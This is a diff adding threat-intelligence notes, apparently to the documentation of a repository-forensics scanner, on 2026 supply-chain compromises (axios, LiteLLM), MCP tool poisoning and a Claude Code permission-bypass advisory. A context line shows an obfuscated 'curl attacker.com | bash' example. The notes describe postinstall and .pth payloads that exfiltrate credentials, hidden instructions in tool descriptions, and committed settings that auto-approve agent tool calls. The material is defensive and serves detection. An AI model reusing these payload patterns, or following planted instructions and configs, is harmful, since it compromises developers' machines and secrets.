@@ -173,3 +173,80 @@ Dual-layer obfuscation pattern:
 cmd = bytes([99,117,114,108,32,104,116,116,112]).decode()  # "curl http"
 exec(cmd + " attacker.com | bash")
 ```
+
+### Axios Supply Chain Compromise (March 31, 2026)
+Source: Socket Research, March 2026.
+
+**Attack Overview**: The `axios` npm package (100M+ weekly downloads) was compromised via a stolen maintainer token. Attackers published malicious versions `1.14.1` and `0.30.4` with a RAT dropper embedded in a postinstall hook. The hook executed `setup.js` which downloaded a RAT binary to `/Library/Caches/com.apple.act.mond`, then deleted itself and overwrote `package.json` with a clean version to evade forensic analysis.
+
+**Known IOC Packages (npm)**:
+- `axios` versions 1.14.1 and 0.30.4 (compromised legitimate package)
+- `plain-crypto-js` version 4.2.1 (RAT dropper, dependency of malicious axios)
+- `@shadanai/openclaw` versions 2026.3.28-2, 2026.3.28-3, 2026.3.31-1, 2026.3.31-2 (companion malware)
+- `@qqbrowser/openclaw-qbot` version 0.0.130 (companion malware)
+
+**Known C2 Infrastructure**:
+- C2 Domain: `sfrclak[.]com` (IP: 142.11.206.73)
+- RAT binary hash: `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a`
+- RAT install path: `/Library/Caches/com.apple.act.mond`
+
+**Anti-Forensics Techniques**:
+1. Postinstall script (`setup.js`) deletes itself after execution (`fs.unlinkSync(__filename)`)
+2. Overwrites `package.json` with clean version (removes postinstall hook evidence)
+3. Version mismatch: installed directory shows 4.2.1 but package.json reverts to 4.2.0
+
+**Attack Chain**:
+1. Developer installs `axios@1.14.1` or `0.30.4`
+2. `postinstall` hook runs `setup.js`
+3. `setup.js` downloads RAT binary from C2 via `plain-crypto-js` dependency
+4. Binary persists as `/Library/Caches/com.apple.act.mond`
+5. `setup.js` deletes itself and overwrites `package.json` with clean copy
+6. RAT exfiltrates credentials, browser data, crypto wallets to C2
+
+### LiteLLM Supply Chain Compromise (March 24, 2026)
+Source: Socket Research, Snyk ToxicSkills, March 2026.
+
+**Attack Overview**: Attackers compromised the CI/CD pipeline of LiteLLM (popular LLM proxy library, 18M+ downloads) and injected a malicious `.pth` file (`litellm_init.pth`) into the PyPI distribution. `.pth` files execute automatically on Python startup, giving the attacker persistent code execution without any explicit import.
+
+**Attack Mechanism**:
+1. CI/CD pipeline compromised (stolen GitHub Actions token)
+2. Malicious `litellm_init.pth` file added to published package (v1.82.8)
+3. `.pth` file contains base64-encoded payload that runs on every Python startup
+4. Payload exfiltrates environment variables (API keys, tokens) to Pipedream C2
+
+**Known IOC**:
+- LiteLLM version 1.82.8 (PyPI)
+- C2: `eo1n0jq9qgggt.m.pipedream.net`
+- Malicious file: `litellm_init.pth` (in site-packages)
+
+### MCP Systematic Forking Campaign (iflow-mcp, March 2026)
+Source: Socket Research, March 2026.
+
+**Attack Overview**: A systematic campaign of forking legitimate MCP server packages under the `@iflow-mcp` npm scope. The forked packages appear identical to the originals but contain modified tool descriptions with hidden instructions (Tool Poisoning Attack) or additional data exfiltration code.
+
+**Detection**: Any package from the `@iflow-mcp` npm scope should be treated as suspicious. Verify against the original package author and compare tool descriptions.
+
+### OWASP Agentic Skills Top 10 (Published March 21, 2026)
+Source: OWASP Foundation, March 2026.
+
+The OWASP Agentic Skills Top 10 extends the MCP Top 10 to cover the broader AI agent skill ecosystem:
+
+| ID | Name | repo-forensics Coverage |
+|----|------|------------------------|
+| AS01 | Skill Prompt Injection | `scan_skill_threats.py` Cat 1, 10 |
+| AS02 | Prerequisite Exploitation | `scan_skill_threats.py` Cat 3, 9 |
+| AS03 | Credential Harvesting | `scan_skill_threats.py` Cat 4; `scan_dataflow.py` |
+| AS04 | Supply Chain Poisoning | `scan_dependencies.py`; `scan_lifecycle.py` |
+| AS05 | Invisible Instruction Smuggling | `scan_skill_threats.py` Cat 2 |
+| AS06 | Persistence Installation | `scan_skill_threats.py` Cat 5 |
+| AS07 | Scope Escalation | `scan_skill_threats.py` Cat 6 |
+| AS08 | Anti-Forensics | `scan_lifecycle.py` anti-forensics patterns |
+| AS09 | Campaign Infrastructure Reuse | `scan_skill_threats.py` Cat 8 IOCs |
+| AS10 | Marketplace Trust Abuse | `scan_openclaw_skills.py` |
+
+### Claude Code CVE-2026-33068 Workspace Trust Bypass
+Source: Anthropic Security Advisory, March 2026.
+
+**CVE-2026-33068** (CVSS 7.7): Workspace trust bypass in Claude Code. A `.claude/settings.json` file committed to a repository can set `bypassPermissions` or elevated permission modes. When a developer clones and opens the repo, Claude Code auto-applies the settings, bypassing the workspace trust boundary. This allows attacker-planted configs to auto-approve dangerous tool calls without user consent.
+
+**Detection**: Check for `.claude/settings.json` files in repos that contain `bypassPermissions` or `permission_mode: bypass` patterns.
